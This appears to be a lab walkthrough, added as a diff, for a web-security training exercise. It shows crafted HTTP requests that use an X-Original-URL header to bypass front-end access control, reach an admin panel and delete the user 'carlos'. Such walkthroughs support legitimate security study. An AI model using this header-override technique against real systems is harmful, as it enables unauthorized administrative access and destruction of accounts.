@@ -1,0 +1,49 @@
+URL-based access control can be circumvented
+
+I couldn't get this to work with repeater since there are a bunch of forwards involved.
+
+Follow the steps provided in the solution until the last one. The last step is a bit unclear. Here's how the request is supposed to look like:
+
+GET /?username=carlos HTTP/1.1
+Host: ac821f831fe6c10380025bcd00a00063.web-security-academy.net
+X-Original-URL: /admin/delete
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=k7kEwNKfgZiH40nXvX8ubWGWG4gPDNva
+Upgrade-Insecure-Requests: 1
+
+
+
+Unfortunately, you are hit with a redirect and are forced to make another request. It looks like this: 
+
+GET /admin HTTP/1.1
+Host: ac821f831fe6c10380025bcd00a00063.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac821f831fe6c10380025bcd00a00063.web-security-academy.net/admin
+Connection: close
+Cookie: session=k7kEwNKfgZiH40nXvX8ubWGWG4gPDNva
+Upgrade-Insecure-Requests: 1
+
+So, intercept the request and the redirect and make sure to change to X-Original-URL: /admin and the source URL to /
+
+Should look like this:
+
+GET / HTTP/1.1
+Host: ac821f831fe6c10380025bcd00a00063.web-security-academy.net
+X-Original-URL: /admin
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac821f831fe6c10380025bcd00a00063.web-security-academy.net/admin
+Connection: close
+Cookie: session=k7kEwNKfgZiH40nXvX8ubWGWG4gPDNva
+Upgrade-Insecure-Requests: 1
+
+Forward the request and responses and carlos should be deleted. Good job!
